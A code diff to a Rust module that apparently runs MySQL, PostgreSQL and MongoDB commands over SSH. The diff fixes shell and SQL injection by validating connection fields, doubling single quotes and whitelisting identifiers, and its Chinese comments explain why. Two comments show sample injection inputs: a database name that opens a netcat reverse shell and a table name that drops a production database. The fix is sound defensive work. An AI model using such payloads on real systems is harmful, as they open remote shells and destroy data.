@@ -74,10 +74,8 @@ pub struct DbStats {
 // ==================== Helpers ====================
 
 /// Shell-escape a password for safe embedding in single-quoted strings.
-/// Replaces `'` with `'\''` (end quote, escaped quote, start quote).
-fn shell_escape(s: &str) -> String {
-    s.replace('\'', "'\\''")
-}
+/// 统一实现见 crate::shell_escape（外层引号写在各 format! 串里）。
+use crate::shell_escape::shq_inner as shell_escape;
 
 /// 校验数据库连接标识(主机/用户名/库名)。这些字段会拼进 CLI 命令,
 /// 合法值只含字母数字与 . _ - : @(host 的 : 用于 IPv6/端口写法),
@@ -96,6 +94,19 @@ fn validate_db_field(label: &str, value: &str) -> Result<(), String> {
     if value.starts_with('-') {
         return Err(format!("{}不能以 - 开头:{}", label, value));
     }
+    Ok(())
+}
+
+/// 校验一组连接标识。
+///
+/// 抽成函数是因为此前只有 execute_sql 记得逐条调用 validate_db_field，
+/// 而 backup_database / get_db_stats 都漏了 —— 两者同样把 host/user/db
+/// 拼进 CLI，且**不加引号**，等于把注入口开在旁边。凡是要拼 CLI 的入口
+/// 都必须先过这一关。
+fn validate_conn_fields(conn: &DbConnection, database: &str) -> Result<(), String> {
+    validate_db_field("主机名", &conn.host)?;
+    validate_db_field("用户名", &conn.username)?;
+    validate_db_field("数据库名", database)?;
     Ok(())
 }
 
@@ -245,9 +256,7 @@ pub fn execute_sql(
     let db = conn.database.as_deref().unwrap_or("");
 
     // 拼进 CLI 前先校验连接标识,阻断经由 host/user/db 的注入(port 为 u16 天然安全)
-    validate_db_field("主机名", &conn.host)?;
-    validate_db_field("用户名", &conn.username)?;
-    validate_db_field("数据库名", db)?;
+    validate_conn_fields(conn, db)?;
 
     let cmd = match db_type {
         "mysql" => {
@@ -478,7 +487,8 @@ pub fn list_tables(
         "mysql" => {
             let sql = format!(
                 "SELECT TABLE_NAME, TABLE_ROWS, CONCAT(ROUND(DATA_LENGTH/1024,2),' KB'), ENGINE FROM information_schema.TABLES WHERE TABLE_SCHEMA='{}'",
-                database.replace('\'', "\\'")
+                // 双写单引号：反斜杠转义在 MySQL 开启 NO_BACKSLASH_ESCAPES 后就失效
+                crate::shell_escape::escape_sql_literal(database)
             );
             let result = execute_sql(ssh, db_type, conn, &sql)?;
             if let Some(ref err) = result.error {
@@ -557,6 +567,16 @@ pub fn list_columns(
 ) -> Result<Vec<ColumnInfo>, String> {
     match db_type {
         "mysql" => {
+            // DESCRIBE 的库名/表名是**标识符**，落在 mysql -e '<sql>' 里。
+            // 外层的 shell 转义只防 shell 层，防不住 SQL 层的 `;` 分号注入
+            // （table = "t; DROP DATABASE prod; -- " 会被执行）。
+            // 标识符没法靠转义解决，只能白名单校验后拒绝。
+            if !crate::shell_escape::is_valid_sql_ident(database) {
+                return Err(format!("非法的数据库名: {}", database));
+            }
+            if !crate::shell_escape::is_valid_sql_ident(table) {
+                return Err(format!("非法的表名: {}", table));
+            }
             let sql = format!("DESCRIBE {}.{}", database, table);
             let result = execute_sql(ssh, db_type, conn, &sql)?;
             if let Some(ref err) = result.error {
@@ -586,7 +606,10 @@ pub fn list_columns(
                  LEFT JOIN information_schema.key_column_usage kcu ON c.column_name = kcu.column_name AND c.table_name = kcu.table_name \
                  LEFT JOIN information_schema.table_constraints tc ON kcu.constraint_name = tc.constraint_name AND tc.constraint_type = 'PRIMARY KEY' \
                  WHERE c.table_name='{}'",
-                table.replace('\'', "\\'")
+                // 必须双写单引号，不能用 \' —— PostgreSQL 自 9.1 起默认
+                // standard_conforming_strings=on，此时 \ 在 '...' 内是普通字符，
+                // 输入 x'-- 会变成 'x\'--'，字符串在反斜杠后的引号处提前闭合。
+                crate::shell_escape::escape_sql_literal(table)
             );
             let result = execute_sql(ssh, "postgresql", &pg_conn, &sql)?;
             if let Some(ref err) = result.error {
@@ -773,6 +796,11 @@ pub fn backup_database(
     conn: &DbConnection,
     database: &str,
 ) -> Result<String, String> {
+    // 此前这里没有任何校验，而下面的 mysqldump/pg_dump/mongodump 把
+    // {db}/{host}/{user} **不加引号**拼进命令 —— database="x; nc -e /bin/sh a 4444; #"
+    // 就会在远端以 SSH 用户身份执行。
+    validate_conn_fields(conn, database)?;
+
     let escaped_pass = shell_escape(&conn.password);
     let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S").to_string();
 
@@ -852,6 +880,9 @@ pub fn get_db_stats(
     db_type: &str,
     conn: &DbConnection,
 ) -> Result<DbStats, String> {
+    // 同 backup_database：host/user 会不加引号拼进 mysql/psql 命令行
+    validate_conn_fields(conn, conn.database.as_deref().unwrap_or(""))?;
+
     match db_type {
         "mysql" => {
             let commands = vec![
